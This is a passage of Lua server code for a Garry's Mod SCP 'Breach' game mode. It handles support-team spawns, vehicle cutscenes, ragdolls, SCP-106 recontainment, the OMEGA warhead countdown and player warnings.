		if pickedsupport == "NTF" then
			ply:NTF_Scene()
		end

	end

	if cutscene == 2 then
		cutsceneinprogress = true
		PerformFBICutscene()
	elseif cutscene == 1 then
		cutsceneinprogress = true
		PerformChaosCutscene()
	else
		cutsceneinprogress = false
	end

	BREACH.QueuedSupports = {}
	net.Start("SelectRole_Sync")
	net.WriteTable(BREACH.QueuedSupports)
	net.Broadcast()

	timer.Simple(1, function()
		local theteam = stringtoteam[pickedsupport]
		for i, v in pairs(player.GetAll()) do
			if v:GTeam() == theteam and v:IsPremium() and !string.lower(v:GetRoleName()):find("spy") then
				timer.Simple(45, function()
					if IsValid(v) then
						v.CanSwitchRole = false
					end
			   end)
				v.CanSwitchRole = true
				v:bSendLua("Select_Supp_Menu(LocalPlayer():GTeam())")
			end
		end
	end)


end


SCP914InUse = false
function Use914( ent )
end

net.Receive("ProceedUnfreezeSUP", function(len, ply)
	if ply:GetPos():WithinAABox(Vector(-12567.743164, 1898.758057, 1451.911499), Vector(-8876.950195, -1525.694458, 2740.886963)) then
		ply:Freeze(false)
		ply.MovementLocked = nil
	end
end)

function OpenSCPDoors()
	for k, v in pairs( ents.FindByClass( "func_door" ) ) do
		for k0, v0 in pairs( POS_DOOR ) do
			if ( v:GetPos() == v0 ) then
				v:Fire( "unlock" )
				v:Fire( "open" )
			end
		end
	end
	for k, v in pairs( ents.FindByClass( "func_button" ) ) do
		for k0, v0 in pairs( POS_BUTTON ) do
			if ( v:GetPos() == v0 ) then
				v:Fire( "use" )
			end
		end
	end
	for k, v in pairs( ents.FindByClass( "func_rot_button" ) ) do
		for k0, v0 in pairs( POS_ROT_BUTTON ) do
			if ( v:GetPos() == v0 ) then
				v:Fire( "use" )
			end
		end
	end
end

function GetAlivePlayers()
	local plys = {}
	for k,v in pairs(player.GetAll()) do
		if v:GTeam() != TEAM_SPEC then
			if v:Alive() and v:Health() >= 0 and v:GTeam() != TEAM_ARENA then
				table.ForceInsert(plys, v)
			end
		end
	end
	return plys
end

function BroadcastDetection( ply, tab )
	local transmit = { ply }
	local radio = ply:GetWeapon( "item_radio" )

	if radio and radio.Enabled and radio.Channel > 4 then
		local ch = radio.Channel

		for k, v in pairs( player.GetAll() ) do
			if v:GTeam() != TEAM_SCP and v:GTeam() != TEAM_SPEC and v != ply then
				local r = v:GetWeapon( "item_radio" )

				if r and r.Enabled and r.Channel == ch then
					table.insert( transmit, v )
				end
			end
		end
	end

	local info = {}

	for k, v in pairs( tab ) do
		table.insert( info, {
			name = v:GetRoleName(),
			pos = v:GetPos() + v:OBBCenter()
		} )
	end

	net.Start( "CameraDetect" )
		net.WriteTable( info )
	net.Send( transmit )
end

function GM:GetFallDamage( ply, speed )
	local tr = util.TraceHull({
		start = ply:GetPos(),
		mins = ply:OBBMins(),
		maxs = ply:OBBMaxs(),
		filter = ply,
		endpos = ply:GetPos() - Vector(0,0,150)
	})
	local victim = tr.Entity
	if victim and victim:IsValid() and victim:IsPlayer() then
		local dmginfo = DamageInfo()
		dmginfo:SetDamage(speed/3)
		dmginfo:SetDamageType(DMG_FALL)
		dmginfo:SetAttacker(ply)
		victim:TakeDamageInfo(dmginfo)
	end
	return ( speed / 6 )*2
end

function GM:OnEntityCreated( ent )
	ent:SetShouldPlayPickupSound( false )
end

function GetPlayer(nick)
	for k,v in pairs(player.GetAll()) do
		if v:Nick() == nick then
			return v
		end
	end
	return nil
end

function CreateRagdollPL(victim, attacker, dmgtype)
	if victim:GetGTeam() == TEAM_SPEC then return end
	if not IsValid(victim) then return end

	local rag = ents.Create("prop_ragdoll")
	if not IsValid(rag) then return nil end

	if victim.DeathReason == "Headshot" then
		rag:SetPos(victim:GetPos())
		rag:SetModel(victim:GetModel())
		rag:SetAngles(victim:GetAngles())
		rag:SetColor(victim:GetColor())
		rag:SetBodygroup( 0, victim:GetBodygroup(0))
		rag:SetBodygroup( 1, victim:GetBodygroup(1))
		rag:SetBodygroup( 2, victim:GetBodygroup(2))
		rag:SetBodygroup( 3, victim:GetBodygroup(3))
		rag:SetBodygroup( 4, victim:GetBodygroup(4))
		rag:SetBodygroup( 5, victim:GetBodygroup(5))
		rag:SetBodygroup( 6, victim:GetBodygroup(6))
		rag:SetBodygroup( 7, victim:GetBodygroup(7))
		rag:SetBodygroup( 8, victim:GetBodygroup(8))
		rag:SetBodygroup( 9, victim:GetBodygroup(9))
		rag:SetBodygroup( 10, victim:GetBodygroup(10))
		rag:SetBodygroup( 11, victim:GetBodygroup(11))
		rag:SetBodygroup( 12, victim:GetBodygroup(12))
		rag:SetBodygroup( 13, victim:GetBodygroup(13))
	
		rag:Spawn()
		rag:Activate()
		
		rag.Info = {}
		rag.Info.CorpseID = rag:GetCreationID()
		rag:SetNWInt( "CorpseID", rag.Info.CorpseID )
		rag.Info.Victim = victim:Nick()
		rag.Info.DamageType = dmgtype
		rag.Info.Time = CurTime()
	
		if victim:GetRoleName() != Dispatcher then
	
			Bonemerge( "models/cultist/heads/gibs/gib_head.mdl", rag )
	
		end

		
	
	else
		rag:SetPos(victim:GetPos())
		rag:SetModel(victim:GetModel())
		rag:SetAngles(victim:GetAngles())
		rag:SetColor(victim:GetColor())
		rag:SetBodygroup( 0, victim:GetBodygroup(0))
		rag:SetBodygroup( 1, victim:GetBodygroup(1))
		rag:SetBodygroup( 2, victim:GetBodygroup(2))
		rag:SetBodygroup( 3, victim:GetBodygroup(3))
		rag:SetBodygroup( 4, victim:GetBodygroup(4))
		rag:SetBodygroup( 5, victim:GetBodygroup(5))
		rag:SetBodygroup( 6, victim:GetBodygroup(6))
		rag:SetBodygroup( 7, victim:GetBodygroup(7))
		rag:SetBodygroup( 8, victim:GetBodygroup(8))
		rag:SetBodygroup( 9, victim:GetBodygroup(9))
		rag:SetBodygroup( 10, victim:GetBodygroup(10))
		rag:SetBodygroup( 11, victim:GetBodygroup(11))
		rag:SetBodygroup( 12, victim:GetBodygroup(12))
		rag:SetBodygroup( 13, victim:GetBodygroup(13))
	
		rag:Spawn()
		rag:Activate()
		
		rag.Info = {}
		rag.Info.CorpseID = rag:GetCreationID()
		rag:SetNWInt( "CorpseID", rag.Info.CorpseID )
		rag.Victim = victim:Nick()
		rag.DamageType = dmgtype
		rag.Info.Time = CurTime()
	
		if ( victim.BoneMergedEnts ) then
	
			for _, v in ipairs( victim.BoneMergedEnts ) do
	
				if ( v && v:IsValid() ) then
	
					Bonemerge( v:GetModel(), rag )
	
				end
	
			end
	
		end
	
		if ( victim.BoneMergedHackerHat ) then
	
			for _, v in ipairs( victim.BoneMergedHackerHat ) do
	
				if ( v && v:IsValid() ) then
	
					Bonemerge( v:GetModel(), rag )
	
				end
	
			end
	
		end
	end

	rag.DeathReason = victim.DeathReason

	
	local group = COLLISION_GROUP_DEBRIS_TRIGGER
	rag:SetCollisionGroup(group)
	timer.Simple( 1, function() if IsValid( rag ) then rag:CollisionRulesChanged() end end )
	timer.Simple( 60, function() if IsValid( rag ) then rag:Remove() end end )
	
	local num = rag:GetPhysicsObjectCount()-1
	local v = victim:GetVelocity() * 0.35
	
	for i=0, num do
		local bone = rag:GetPhysicsObjectNum(i)
		if IsValid(bone) then
		local bp, ba = victim:GetBonePosition(rag:TranslatePhysBoneToBone(i))
		if bp and ba then
			bone:SetPos(bp)
			bone:SetAngles(ba)
		end
		bone:SetVelocity(v * 1.2)
		end
	end
end

--hook.Add( "EntityFireBullets", "effect_hitshot", function(ent, data)
	--[[
	data.Callback = function(ent, tr, dmginf)
		local effdata = EffectData()
		effdata:SetOrigin(tr.HitPos)
		effdata:SetAngles(Angle(0,0,0))
		effdata:SetEntity(tr.Entity)
		util.Effect("helicopter_impact", effdata)
	end]]

	--if ent:IsPlayer() then
		--ent:SetPos(ent:GetEyeTraceNoCursor().HitPos)
		--local effdata = EffectData()
		--effdata:SetOrigin(ent:GetEyeTraceNoCursor().HitPos)
		--effdata:SetAngles(Angle(0,0,0))
		--effdata:SetEntity(ent)
		--util.Effect("helicopter_impact", effdata)
	--end
	--return true
--end)

hook.Add( "EntityTakeDamage", "NoDamageForProps", function( target, dmginfo )
	--[[
	if !target:IsPlayer() then
		local effdata = EffectData()
		effdata:SetOrigin(dmginfo:GetDamagePosition())
		effdata:SetAngles(Angle(0,0,0))
		effdata:SetEntity(target)
		util.Effect("helicopter_impact", effdata)
	end]]
	if ( target:GetClass() == "prop_physics" ) then
		return true
	end
end )

function ServerSound( file, ent, filter )
	ent = ent or game.GetWorld()
	if !filter then
		filter = RecipientFilter()
		filter:AddAllPlayers()
	end

	local sound = CreateSound( ent, file, filter )

	return sound
end

inUse = false

function takeDamage( ent, ply )
	local dmg = 0
	for k, v in pairs( ents.FindInSphere( POS_MIDDLE_GATE_A, 1000 ) ) do
		if v:IsPlayer() then
			if v:Alive() then
				if v:GTeam() != TEAM_SPEC then
					dmg = ( 1001 - v:GetPos():Distance( POS_MIDDLE_GATE_A ) ) * 10
					if dmg > 0 then 
						v:TakeDamage( dmg, ply or v, ent )
					end
				end
			end
		end
	end
end

function destroyGate()
	if isGateAOpen() then return end
	local doorsEnts = ents.FindInSphere( POS_MIDDLE_GATE_A, 125 )
	for k, v in pairs( doorsEnts ) do
		if v:GetClass() == "prop_dynamic" or v:GetClass() == "func_door" then
			v:Remove()
		end
	end
end

function isGateAOpen()
	local doors = ents.FindInSphere( POS_MIDDLE_GATE_A, 125 )
	for k, v in pairs( doors ) do
		if v:GetClass() == "prop_dynamic" then 
			if isInTable( v:GetPos(), POS_GATE_A_DOORS ) then return false end
		end
	end
	return true
end

function Recontain106( ply )
	if Recontain106Used  then
		ply:PrintMessage( HUD_PRINTCENTER, "SCP 106 recontain procedure can be triggered only once per round" )
		return false
	end

	local cage
	for k, v in pairs( ents.GetAll() ) do
		if v:GetPos() == CAGE_DOWN_POS then
			cage = v
			break
		end
	end
	if !cage then
		ply:PrintMessage( HUD_PRINTCENTER, "Power down ELO-IID electromagnet in order to start SCP 106 recontain procedure" )
		return false
	end

	local e = ents.FindByName( SOUND_TRANSMISSION_NAME )[1]
	if e:GetAngles().roll == 0 then
		ply:PrintMessage( HUD_PRINTCENTER, "Enable sound transmission in order to start SCP 106 recontain procedure" )
		return false
	end

	local fplys = ents.FindInBox( CAGE_BOUNDS.MINS, CAGE_BOUNDS.MAXS )
	local plys = {}
	for k, v in pairs( fplys ) do
		if IsValid( v ) and v:IsPlayer() and v:GTeam() != TEAM_SPEC and v:GTeam() != TEAM_SCP then
			table.insert( plys, v )
		end
	end

	if #plys < 1 then
		ply:PrintMessage( HUD_PRINTCENTER, "Living human in cage is required in order to start SCP 106 recontain procedure" )
		return false
	end

	local scps = {}
	for k, v in pairs( player.GetAll() ) do
		if IsValid( v ) and v:GTeam() == TEAM_SCP and v:GetRoleName() == SCP106 then
			table.insert( scps, v )
		end
	end

	if #scps < 1 then
		ply:PrintMessage( HUD_PRINTCENTER, "SCP 106 is already recontained" )
		return false
	end

	Recontain106Used = true

	timer.Simple( 6, function()
		if postround or !Recontain106Used then return end
		for k, v in pairs( plys ) do
			if IsValid( v ) then
				v:Kill()
			end
		end

		for k, v in pairs( scps ) do
			if IsValid( v ) then
				local swep = v:GetActiveWeapon()
				if IsValid( swep ) and swep:GetClass() == "weapon_scp_106" then
					swep:TeleportSequence( CAGE_INSIDE )
				end
			end
		end

		timer.Simple( 11, function()
			if postround or !Recontain106Used then return end
			for k, v in pairs( scps ) do
				if IsValid( v ) then
					v:Kill()
				end
			end
			local eloiid = ents.FindByName( ELO_IID_NAME )[1]
			eloiid:Use( game.GetWorld(), game.GetWorld(), USE_TOGGLE, 1 )
			if IsValid( ply ) then
				ply:PrintMessage(HUD_PRINTTALK, "You've been awarded with 10 points for recontaining SCP 106!")
				--ply:AddFrags( 10 )
			end
		end )


	end )

	return true
end

local ment = FindMetaTable("Entity")

function IsGroundPos(pos)
	local tr = util.TraceLine({
		start = pos,
		endpos = pos - Vector(0,0,10)
	})

	if tr.HitWorld or (IsValid(tr.Entity) and (tr.Entity:GetClass() == "prop_dynamic" or tr.Entity:GetClass() == "prop_physics")) then
		return true
	end

	return false
end

function ment:BrOnGround()
	local tr = util.TraceLine({
		start = self:GetPos(),
		filter = self,
		endpos = self:GetPos() - Vector(0,0,10-self:OBBMins().z)
	})

	if tr.HitWorld or (IsValid(tr.Entity) and (tr.Entity:GetClass() == "prop_dynamic" or tr.Entity:GetClass() == "prop_physics")) then
		return true
	end

	return false
end

OMEGAEnabled = false
OMEGADoors = false
function OMEGAWarhead( ply )
	if OMEGAEnabled then return end

	local remote = ents.FindByName( OMEGA_REMOTE_NAME )[1]
	if GetConVar( "br_enable_warhead" ):GetInt() != 1 or remote:GetAngles().pitch == 180 then
		ply:PrintMessage( HUD_PRINTCENTER, "You inserted keycard but nothing happened" )
		return
	end

	OMEGAEnabled = true

	--local alarm = ServerSound( "warhead/alarm.ogg" )
	--alarm:SetSoundLevel( 0 )
	--alarm:Play()
	net.Start( "SendSound" )
		net.WriteInt( 1, 2 )
		net.WriteString( "warhead/alarm.ogg" )
	net.Broadcast()

	timer.Create( "omega_announcement", 3, 1, function()
		--local announcement = ServerSound( "warhead/announcement.ogg" )
		--announcement:SetSoundLevel( 0 )
		--announcement:Play()
		net.Start( "SendSound" )
			net.WriteInt( 1, 2 )
			net.WriteString( "warhead/announcement.ogg" )
		net.Broadcast()

		timer.Create( "omega_delay", 11, 1, function()
			for k, v in pairs( ents.FindByClass( "func_door" ) ) do
				if IsInTolerance( OMEGA_GATE_A_DOORS[1], v:GetPos(), 100 ) or IsInTolerance( OMEGA_GATE_A_DOORS[2], v:GetPos(), 100 ) then
					v:Fire( "Unlock" )
					v:Fire( "Open" )
					v:Fire( "Lock" )
				end
			end

			OMEGADoors = true

			--local siren = ServerSound( "warhead/siren.ogg" )
			--siren:SetSoundLevel( 0 )
			--siren:Play()
			net.Start( "SendSound" )
				net.WriteInt( 1, 2 )
				net.WriteString( "warhead/siren.ogg" )
			net.Broadcast()
			timer.Create( "omega_alarm", 12, 5, function()
				--siren = ServerSound( "warhead/siren.ogg" )
				--siren:SetSoundLevel( 0 )
				--siren:Play()
				net.Start( "SendSound" )
					net.WriteInt( 1, 2 )
					net.WriteString( "warhead/siren.ogg" )
				net.Broadcast()
			end )

			timer.Create( "omega_check", 1, 89, function()
				if !IsValid( remote ) or remote:GetAngles().pitch == 180 or !OMEGAEnabled then
					WarheadDisabled( siren )
				end
			end )
		end )

		timer.Create( "omega_detonation", 90, 1, function()
			--local boom = ServerSound( "warhead/explosion.ogg" )
			--boom:SetSoundLevel( 0 )
			--boom:Play()
			net.Start( "SendSound" )
				net.WriteInt( 1, 2 )
				net.WriteString( "warhead/explosion.ogg" )
			net.Broadcast()
			for k, v in pairs( player.GetAll() ) do
				v:Kill()
			end
		end )
	end )
end

function PerformALPH9Cutscene()
	local alp9 = {}
	local havecmd = false
	local havespecial = false
	local havegunner = false
	for _, ply in pairs(player.GetAll()) do
		if ply:GTeam() == TEAM_NTF and !ply:GetRoleName():find("Spy") then
			alp9[#alp9 + 1] = ply
			if ply:GetRoleName() == role.NTF_Commander then havecmd = true end
			if ply:GetRoleName() == role.NTF_Sniper then havespecial = true end
		end
	end

	local Sits = {
		"driver",
		"infront",
		"middle",
		"right",
		"left",
	}

	local CurrentSit = {
		["driver"] = NULL,
		["infront"] = NULL,
		["middle"] = NULL,
		["right"] = NULL,
		["left"] = NULL
	}
	local function TakeSit(sit, ply)
		table.RemoveByValue(Sits, sit)
		CurrentSit[sit] = ply
	end
	for i, ply in ipairs(alp9) do
		if ply:GetRoleName() == role.NTF_Commander then TakeSit("driver", ply) continue end
		if ply:GetRoleName() == role.NTF_Sniper then TakeSit("infront", ply) continue end
		if !havecmd and table.HasValue(Sits, "driver") then TakeSit("driver", ply) continue end
		if !havespecial and table.HasValue(Sits, "infront") then TakeSit("infront", ply) continue end
		if table.HasValue(Sits, "right") then TakeSit("right", ply) continue end
		if table.HasValue(Sits, "left") then TakeSit("left", ply) continue end
		if table.HasValue(Sits, "middle") then TakeSit("middle", ply) continue end
	end

	local carjeep = ents.Create("prop_physics")
	carjeep:SetModel("models/scpcars/scpp_wrangler_fnf.mdl")
	carjeep:SetPos(Vector(-7103.528809, 15068.817383, 2038.158203))
	carjeep:SetAngles(Angle(0, 0, 0))
	carjeep:Spawn()
	carjeep:SetSolid(SOLID_NONE)
	carjeep:SetMoveType(MOVETYPE_NONE)
	carjeep:PhysicsInit(SOLID_NONE)
	carjeep:PhysicsDestroy()

	for sit, ply in pairs(CurrentSit) do
		if IsValid(ply) then
			local anim = "0_fbi_sit"
			local pos = Vector(-7079.692871, 15038.501953, 2083.030762)
			if sit == "left" then
				pos = Vector(-7125.122070, 15037.874023, 2083.116455)
			elseif sit == "middle" then
				anim = "0_fbi_sit_middle"
				pos = Vector(-7104.778320, 15034.896484, 2082.654297)
			elseif sit == "infront" then
				anim = "0_fbi_sit_infront"
				pos = Vector(-7082.834961, 15082.277344, 2079.999756)
			elseif sit == "driver" then
				anim = "0_fbi_driver"
				pos = Vector(-7124.449219, 15088.336914, 2075.815186)
			end
			ply:SetMoveType(MOVETYPE_OBSERVER)
			ply:GuaranteedSetPos(pos)
			ply:SetNWAngle("ViewAngles", Angle(0, 90, 0))
			ply:SetForcedAnimation(anim, 65)
			ply:SetNWEntity("NTF1Entity", ply)
			ply:GodEnable()
		end
	end

	timer.Simple(20, function()
		for _, ply in ipairs(alp9) do
			if IsValid(ply) and ply:GTeam() == TEAM_NTF and !ply:GetRoleName():find("Spy")  then ply:ScreenFade(SCREENFADE.IN, Color(0,0,0), 1, 3) end
		end
		timer.Simple(2, function()
			if IsValid(carjeep) then carjeep:StopSound("nextoren/vehicle/jee_wranglerfnf/third.wav") carjeep:Remove() end
			for i, ply in ipairs(alp9) do
				if IsValid(ply) and ply:GTeam() == TEAM_NTF and !ply:GetRoleName():find("Spy")  then
					ply:SetPos(SPAWN_APL9[i])
					ply:StopForcedAnimation()
					ply:SetMoveType(MOVETYPE_WALK)
					ply:SetNWEntity("NTF1Entity", NULL)
					ply:SetNWAngle("ViewAngles", Angle(0,0,0))
					ply:GodDisable()
				end
			end
			ProceedChangePremiumRoles()
		end)
	end)

	carjeep:EmitSound("nextoren/vehicle/jee_wranglerfnf/third.wav", 55, 77, 0.75)

end

function PerformFBICutscene()
	local fbis = {}
	local havecmd = false
	local havespecial = false
	local haveclocker = false
	for _, ply in pairs(player.GetAll()) do
		if ply:GTeam() == TEAM_USA and !ply:GetRoleName():find("Spy") then
			fbis[#fbis + 1] = ply
			if ply:GetRoleName() == role.UIU_Agent_Commander then havecmd = true end
			if ply:GetRoleName() == role.UIU_Agent_Specialist then havespecial = true end
		end
	end

	local Sits = {
		"driver",
		"infront",
		"middle",
		"right",
		"left",
	}

	local CurrentSit = {
		["driver"] = NULL,
		["infront"] = NULL,
		["middle"] = NULL,
		["right"] = NULL,
		["left"] = NULL
	}
	local function TakeSit(sit, ply)
		table.RemoveByValue(Sits, sit)
		CurrentSit[sit] = ply
	end
	for i, ply in ipairs(fbis) do
		if ply:GetRoleName() == role.UIU_Agent_Commander then TakeSit("driver", ply) continue end
		if ply:GetRoleName() == role.UIU_Agent_Specialist then TakeSit("infront", ply) continue end
		if !havecmd and table.HasValue(Sits, "driver") then TakeSit("driver", ply) continue end
		if !havespecial and table.HasValue(Sits, "infront") then TakeSit("infront", ply) continue end
		if table.HasValue(Sits, "right") then TakeSit("right", ply) continue end
		if table.HasValue(Sits, "left") then TakeSit("left", ply) continue end
		if table.HasValue(Sits, "middle") then TakeSit("middle", ply) continue end
	end

	local carjeep = ents.Create("prop_physics")
	carjeep:SetModel("models/scpcars/scpp_wrangler_fnf.mdl")
	carjeep:SetPos(Vector(-7103.528809, 15068.817383, 2038.158203))
	carjeep:SetAngles(Angle(0, 0, 0))
	carjeep:Spawn()
	carjeep:SetSolid(SOLID_NONE)
	carjeep:SetMoveType(MOVETYPE_NONE)
	carjeep:PhysicsInit(SOLID_NONE)
	carjeep:PhysicsDestroy()

	for sit, ply in pairs(CurrentSit) do
		if IsValid(ply) then
			local anim = "0_fbi_sit"
			local pos = Vector(-7079.692871, 15038.501953, 2083.030762)
			if sit == "left" then
				pos = Vector(-7125.122070, 15037.874023, 2083.116455)
			elseif sit == "middle" then
				anim = "0_fbi_sit_middle"
				pos = Vector(-7104.778320, 15034.896484, 2082.654297)
			elseif sit == "infront" then
				anim = "0_fbi_sit_infront"
				pos = Vector(-7082.834961, 15082.277344, 2079.999756)
			elseif sit == "driver" then
				anim = "0_fbi_driver"
				pos = Vector(-7124.449219, 15088.336914, 2075.815186)
			end
			ply:SetMoveType(MOVETYPE_OBSERVER)
			ply:GuaranteedSetPos(pos)
			ply:SetNWAngle("ViewAngles", Angle(0, 90, 0))
			ply:SetForcedAnimation(anim, 65)
			ply:SetNWEntity("NTF1Entity", ply)
			ply:GodEnable()
		end
	end

	timer.Simple(20, function()
		for _, ply in ipairs(fbis) do
			if IsValid(ply) and ply:GTeam() == TEAM_USA and !ply:GetRoleName():find("Spy")  then ply:ScreenFade(SCREENFADE.IN, Color(0,0,0), 1, 3) end
		end
		timer.Simple(2, function()
			if IsValid(carjeep) then carjeep:StopSound("nextoren/vehicle/jee_wranglerfnf/third.wav") carjeep:Remove() end
			for i, ply in ipairs(fbis) do
				if IsValid(ply) and ply:GTeam() == TEAM_USA and !ply:GetRoleName():find("Spy")  then
					ply:SetPos(SPAWN_OUTSIDE[i])
					ply:StopForcedAnimation()
					ply:SetMoveType(MOVETYPE_WALK)
					ply:SetNWEntity("NTF1Entity", NULL)
					ply:SetNWAngle("ViewAngles", Angle(0,0,0))
					ply:GodDisable()
				end
			end
			ProceedChangePremiumRoles()
		end)
	end)

	carjeep:EmitSound("nextoren/vehicle/jee_wranglerfnf/third.wav", 55, 77, 0.75)

end

function PerformChaosCutscene()

	local CIS = {}

	for _, ply in pairs(player.GetAll()) do
		if ply:GTeam() == TEAM_CHAOS and ply:GetRoleName() != role.SECURITY_Spy then
			CIS[#CIS + 1] = ply
		end
	end

	local leftpositions = {
		Vector(11.198242, -5.783607, -46.736450),
		Vector(-17.891602, -5.120277, -46.736450),
		Vector(-59.575195, 2.673798, -46.736450),
		Vector(-85.702148, 3.341026,-46.736450),
	}
	local rightpositions = {
		Vector(-90.564453, -3.536804, -46.736450),
		Vector(-62.086914, -3.764305, -46.736450),
		--Vector(-10481.501953, -81.029991, 1781.447388),
		Vector(7.801758, 5.529922, -46.736450),
	}
	local rightangle = Angle(0, -90, 0)
	local leftangle = Angle(0, 90, 0)

	local apc_pos = Vector(15200.626953125, 12824.885742188, -15706.223632813)

	local anims = {
		["0_chaos_sit_1"] = 0,
		--["0_chaos_sit_2"] = 0,
		["0_chaos_sit_3"] = 0,
	}

	local function pickanim(role)
		if role == role.Chaos_Jugg then
			return "0_chaos_sit_jug"
		end
		for anim, amount in RandomPairs(anims) do
			if amount > 2 then continue end
			anims[anim] = anims[anim] + 1
			return anim
		end
	end

	local function picksit()
		if #leftpositions <= 0 then

			local index = math.random(1, #rightpositions)
			local pickedsit = rightpositions[index]
			table.RemoveByValue(rightpositions, pickedsit)

			return pickedsit, rightangle

		end
		if #rightpositions <= 0 then

			local index = math.random(1, #leftpositions)
			local pickedsit = leftpositions[index]
			table.RemoveByValue(leftpositions, pickedsit)
			return pickedsit, leftangle

		end
		
		local rand = math.random(1, 2)

		if rand == 1 then

			local index = math.random(1, #leftpositions)
			local pickedsit = leftpositions[index]
			table.RemoveByValue(leftpositions, pickedsit)
			return pickedsit, leftangle

		end

		if rand == 2 then

			local index = math.random(1, #rightpositions)
			local pickedsit = rightpositions[index]
			table.RemoveByValue(rightpositions, pickedsit)
			return pickedsit, rightangle

		end

	end


	local chaosjeep = ents.Create("prop_physics")
	chaosjeep:SetModel("models/scp_chaos_jeep/chaos_jeep.mdl")
	chaosjeep:Spawn()
	chaosjeep:SetMoveType(MOVETYPE_NONE)
	chaosjeep:SetPos(Vector(-10157.23046875, 88.405784606934, 1744.8100585938))
	chaosjeep:SetAngles(Angle(0.011260154657066, 20.347030639648, -0.017242431640625))
	chaosjeep:SetBodygroup(1,1)

	local offset = Vector(79, 0, 93)

	for _, ply in pairs(CIS) do
		if IsValid(ply) and ply:GTeam() == TEAM_CHAOS then
			local pos, ang = picksit()
			ply:SetMoveType(MOVETYPE_OBSERVER)
			ply:GuaranteedSetPos(apc_pos + pos + offset)
			ply:SetNWAngle("ViewAngles", ang)
			local anim = pickanim(ply:GetRoleName())
			ply:SetForcedAnimation(anim, 65)
			ply:SetNWEntity("NTF1Entity", ply)
			ply:GodEnable()
		end
	end

	timer.Create("Sequence_APC_Spawn_Remove", 30, 1, function()
		for _, ply in ipairs(CIS) do
			if IsValid(ply) and ply:GTeam() == TEAM_CHAOS then ply:ScreenFade(SCREENFADE.IN, Color(0,0,0), 1, 3) end
		end
		timer.Simple(2, function()
			for i, ply in ipairs(CIS) do
				if IsValid(ply) and ply:GTeam() == TEAM_CHAOS then
					ply:SetPos(SPAWN_OUTSIDE[i])
					ply:StopForcedAnimation()
					ply:SetMoveType(MOVETYPE_WALK)
					ply:SetNWEntity("NTF1Entity", NULL)
					ply:SetNWAngle("ViewAngles", Angle(0,0,0))
					ply:GodDisable()
				end
			end
			ProceedChangePremiumRoles()
		end)
	end)

end

local function start_command_setwarnings(steamid64, num)

	local result = sql.Query("SELECT warnings FROM awarn_playerdata WHERE unique_id = "..SQLStr(steamid64))

	newMysql.query("SELECT warnings FROM awarn_playerdata WHERE unique_id = "..SQLStr(steamid64), function(result)

        if !result then
        		newMysql.query("INSERT INTO awarn_playerdata VALUES ("..SQLStr(steamid64)..", "..SQLStr(num)..", "..SQLStr(os.time())..")", function() end)
			else
				newMysql.query("UPDATE awarn_playerdata SET warnings = "..SQLStr(num)..", lastwarn = "..SQLStr(os.time()).." WHERE unique_id = "..SQLStr(steamid64), function() end)
			end

    end, function() print("пошел нахуй") end)

end

hook.Add("PlayerShouldTakeDamage", "AntiTeamkill", function( ply, attacker )
	if !attacker:IsPlayer() then
		return
	end

	if attacker:GTeam() == TEAM_ARENA then
		return
	end

	if BREACH.DisableTeamKills and ply:GTeam() == attacker:GTeam() then
		return false
	end
end)

--[[function BREACH.PowerfulGOCSupport(caller)
	if postround then
		--return
	end

	local pickedsupport = "GOC_IN"

	local maxamount = 7
	PlayAnnouncer( "rxsend_music/friendly_goc_in.ogg" )
	local pickedplayers = {}
	if !SPAWNEDPLAYERSASSUPPORT then SPAWNEDPLAYERSASSUPPORT = {} end

	local pick = 0

	if forcesupportplys then
		for _, ply in pairs(forcesupportplys) do
			if pick >= maxamount then break end
			SPAWNEDPLAYERSASSUPPORT[#SPAWNEDPLAYERSASSUPPORT + 1] = ply
			pickedplayers[#pickedplayers + 1] = ply
			pick = pick + 1
		end
		forcesupportplys = nil
	end

	for _, ply in RandomPairs(GetActivePlayers()) do
		print(ply)
		if pick >= maxamount then break end
		if ply:GTeam() != TEAM_SPEC then continue end
		if ply.SpawnAsSupport == false then continue end
		if ply:GetPenaltyAmount() > 0 then continue end
		if LevelRequiredForSupport[pickedsupport] and ply:GetNLevel() < LevelRequiredForSupport[pickedsupport] then continue end
		SPAWNEDPLAYERSASSUPPORT[#SPAWNEDPLAYERSASSUPPORT + 1] = ply
		pickedplayers[#pickedplayers + 1] = ply
		print(ply)
		if ply.LuckyOne then
			ply:CompleteAchievement("lucky")
		else
			ply.LuckyOne = true
		end
		pick = pick + 1
	end

	for _, ply in pairs(player.GetAll()) do
		if !table.HasValue(pickedplayers, ply) then
			ply.LuckyOne = false
		end 
	end

	local supinuse = {}
	local supspawns = table.Copy( SPAWN_FBI_SHTURM )
	local sups = {}

	local notp = cutscene != 0

	for i = 1, #pickedplayers do
		local ply = pickedplayers[i]

		local suproles = table.Copy( GetSupportRoleTable(pickedsupport) )
		local selected

		local shouldselectrole = true

		if shouldselectrole then
			repeat
				local role = table.remove( suproles, math.random( #suproles ) )
				supinuse[role.name] = supinuse[role.name] or 0

				if role.max == 0 or supinuse[role.name] < role.max then
					if role.level <= ply:GetNLevel() then
						if !role.customcheck or role.customcheck( ply ) then
							supinuse[role.name] = supinuse[role.name] + 1
							selected = role
							break
						end
					end
				end
			until #suproles == 0
		end

		local spawn = table.remove( supspawns, math.random( #supspawns ) )

		ply:SetupNormal()
		--timer.Simple(0.1, function()
			--ply:FadeMusic(17)
		--end)
		ply:ApplyRoleStats( selected )
		ply:SetPos( spawn )
		ply:Freeze(true)

	end

	BREACH.QueuedSupports = {}
	net.Start("SelectRole_Sync")
	net.WriteTable(BREACH.QueuedSupports)
	net.Broadcast()

	PlayAnnouncer("nextoren/round_sounds/intercom/support/onpzahod.ogg")
end]]

function BREACH.PowerfulGOCSupport(caller)
	if postround then
		--return
	end

	local pickedsupport = "GOC_IN"

	local maxamount = 7
	PlayAnnouncer( "rxsend_music/friendly_goc_in.ogg" )
	local pickedplayers = {}
	if !SPAWNEDPLAYERSASSUPPORT then SPAWNEDPLAYERSASSUPPORT = {} end

	local pick = 0

	if forcesupportplys then
		for _, ply in pairs(forcesupportplys) do
			if pick >= maxamount then break end
			SPAWNEDPLAYERSASSUPPORT[#SPAWNEDPLAYERSASSUPPORT + 1] = ply
			pickedplayers[#pickedplayers + 1] = ply
			pick = pick + 1
		end
		forcesupportplys = nil
	end

	for _, ply in RandomPairs(GetActivePlayers()) do
		print(ply)
		if pick >= maxamount then break end
		if ply:GTeam() != TEAM_SPEC then continue end
		if ply.SpawnAsSupport == false then continue end
		if ply:GetPenaltyAmount() > 0 then continue end
		if LevelRequiredForSupport[pickedsupport] and ply:GetNLevel() < LevelRequiredForSupport[pickedsupport] then continue end
